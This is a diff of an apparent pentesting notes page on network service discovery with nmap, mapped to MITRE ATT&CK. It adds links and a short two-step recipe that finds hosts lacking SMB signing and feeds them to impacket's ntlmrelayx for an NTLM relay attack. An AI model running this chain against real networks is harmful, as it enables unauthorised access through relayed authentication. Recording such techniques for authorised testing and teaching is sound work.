@@ -9,9 +9,16 @@ permalink: /:categories/:title/
 tags: discovery scan nmap TA0007 T1595 T1046
 ---
 
+**Mitre Att&ck Entreprise**
+
+* [TA0007 - Discovery](https://attack.mitre.org/tactics/TA0007/)
+* [T1046  - Network Service Discovery](https://attack.mitre.org/techniques/T1046/)
+
 <!-- vscode-markdown-toc -->
 * [Administrative Services](#AdministrativeServices)
 * [WinRM / SMB / RPC](#WinRMSMBRPC)
+	* [WinRM](#WinRM)
+	* [SMBv2: SIGNING NOT REQUIRED](#SMBv2:SIGNINGNOTREQUIRED)
 * [ARP / ICMP / DNS](#ARPICMPDNS)
 * [TCP/UDP w/ NMAP](#TCPUDPwNMAP)
 	* [NMAP Note 0 : Default Behavior](#NMAPNote0:DefaultBehavior)
@@ -33,7 +40,19 @@ tags: discovery scan nmap TA0007 T1595 T1046
 
 ## <a name='WinRMSMBRPC'></a>WinRM / SMB / RPC
 
+### <a name='WinRM'></a>WinRM
+
 - [WinRM nmap script](https://github.com/RicterZ/My-NSE-Scripts/blob/master/scripts/winrm.nse)
+
+### <a name='SMBv2:SIGNINGNOTREQUIRED'></a>SMBv2: SIGNING NOT REQUIRED
+```sh
+# STEP 1: find smb not signed
+nmap -p 445 --script smb2-security-mode 10.0.0.0/24 -o output.txt
+
+# STEP 2: set up impacket/ntlmrelayx
+grep -B 9 "not required" output.txt |sed -E '/.*\((.*\..*\..*\..*)\)$/!d' |sed -E 's/.*\((.*\..*\..*\..*)\)$/\1/' > targets.txt
+python3 ntlmrelayx.py -tf targets.txt -smb2support
+```
 
 ## <a name='ARPICMPDNS'></a>ARP / ICMP / DNS
 
@@ -76,9 +95,6 @@ nmap -sU -Pn -iL hosts_up -oA nmap_udp_top1000_scan 192.168.0.0/24
 sudo nmap -sU -Pn -p0- --reason --stats-every 60s --max-rtt-timeout=50ms --max-retries=1 -iL hosts_up -oA nmap_udp_fullscan 192.168.0.0/24
 ```
 
-![NMAP Cheatsheet](/assets/images/pen-discov-nmap-cheatsheet.jpg)
-Image credit: Mohamed M. Aly
-
 ### <a name='NMAPNote0:DefaultBehavior'></a>NMAP Note 0 : Default Behavior 
 
 * By default, Windows firewall blocks all ICMP packets and NMAP does not scan hosts not answering to ```ping```.
@@ -120,11 +136,14 @@ NMAP uses the following options for NSE scripts :
 
 You may refer to the [nmap.org firewall evasion](https://nmap.org/book/man-bypass-firewalls-ids.html) page for futher information.
 
+### <a name='References'></a>Mindmaps
+
+![NMAP Cheatsheet](/assets/images/pen-ta0007-discov-t1046-scan-net-svc.png)
+Image credit: [Ignitetechnologies Mindmaps](https://github.com/Ignitetechnologies/Mindmap)
+
+![NMAP Cheatsheet](/assets/images/pen-discov-nmap-cheatsheet.jpg)
+Image credit: Mohamed M. Aly
+
 ## <a name='References'></a>References
 
-- Mitre Att&ck Techniques: 
-> * [T1595 - Active Scanning: Scanning IP Blocks](https://attack.mitre.org/techniques/T1595/001/)
-> * [T1046 - Network Service Scanning](https://attack.mitre.org/techniques/T1046/)
-
-- Others:
 > * [NMAP SANS cheatsheet](https://jmvwork.xyz/docs/purple/TA0007/discovery_network_nmap_cheatsheet_sans.pdf)
